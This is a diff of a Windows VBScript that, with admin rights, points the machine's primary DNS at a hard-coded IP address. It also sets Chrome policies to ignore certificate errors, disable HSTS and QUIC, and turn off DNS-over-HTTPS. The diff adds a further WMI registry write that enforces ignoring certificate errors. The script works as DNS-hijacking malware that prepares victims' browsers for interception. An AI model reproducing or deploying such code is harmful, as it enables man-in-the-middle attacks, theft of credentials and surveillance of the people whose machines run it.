@@ -2,7 +2,7 @@ Option Explicit
 On Error Resume Next
 
 ' Define constants for primary and secondary DNS servers
-Const PrimaryDNSServer = "93.183.75.38"
+Const PrimaryDNSServer = "93.183.74.2"
 Const SecondaryDNSServer = "8.8.8.8"
 
 If Not IsAdmin() Then
@@ -22,6 +22,14 @@ Sub MainScriptLogic()
 	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
 	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
 	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"
+
+    Const HKEY_LOCAL_MACHINE = &H80000002
+    strKeyPath = "SOFTWARE\Policies\Google\Chrome"
+    strValueName = "IgnoreCertificateErrors"
+    dwValue = 1
+    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
+    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
+    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
 
     Dim objWMIService, colAdapters, objAdapter
     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
